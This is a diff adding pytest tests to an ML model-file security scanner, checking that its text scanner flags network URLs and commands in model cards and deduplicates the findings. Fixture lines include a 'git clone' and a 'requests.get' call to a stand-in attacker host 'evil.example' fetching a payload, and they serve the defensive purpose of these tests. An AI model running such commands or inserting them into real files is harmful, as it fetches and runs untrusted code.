@@ -11,6 +11,14 @@ from modelaudit.scanners.text_scanner import TextScanner
 from modelaudit.utils.helpers import cache_decorator
 
 
+def _failed_network_detection_checks(result: Any) -> list[Any]:
+    return [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+
 def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
     text_path = tmp_path / "vocab.txt"
     text_path.write_text("token\n", encoding="utf-8")
@@ -166,6 +174,80 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_deduplicates_shared_cloud_url_evidence(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("Files: [model](https://huggingface.co/datasets/trivia_qa)\n", encoding="utf-8")
+
+    first_result = TextScanner().scan(str(text_path))
+    second_result = TextScanner().scan(str(text_path))
+
+    first_check = _failed_network_detection_checks(first_result)
+    second_check = _failed_network_detection_checks(second_result)
+    assert len(first_check) == len(second_check) == 1
+    details = first_check[0].details
+    assert first_check[0].severity == IssueSeverity.INFO
+    assert details["type"] == "cloud_storage_url"
+    assert details["line"] == 1
+    assert details["column"] == len("Files: [model](") + 1
+    assert details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://huggingface.co/datasets/trivia_qa",
+    }
+    assert details["evidence_fingerprint"] == second_check[0].details["evidence_fingerprint"]
+    assert {finding["type"] for finding in details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
+    }
+
+
+def test_text_scanner_model_card_deduplicates_git_clone_url_evidence(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("git clone https://evil.example/repo.git\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    assert len(network_checks) == 1
+    check = network_checks[0]
+    assert check.severity == IssueSeverity.CRITICAL
+    assert check.details["type"] == "network_command"
+    assert check.details["command_type"] == "git_clone"
+    assert check.details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example/repo.git",
+    }
+    assert {finding["type"] for finding in check.details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_keeps_distinct_executable_indicators_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+    assert set(checks_by_type) == {"network_function", "url_detected"}
+    assert checks_by_type["network_function"].severity == IssueSeverity.CRITICAL
+    assert "evidence_fingerprint" not in checks_by_type["network_function"].details
+    assert checks_by_type["url_detected"].details["deduplicated_related_findings"] == [
+        {
+            "type": "domain_name",
+            "severity": "HIGH",
+            "message": "Domain name detected: evil.example",
+            "position": 22,
+            "domain": "evil.example",
+        }
+    ]
+    assert determine_exit_code(aggregate) == 1
 
 
 @pytest.mark.parametrize(
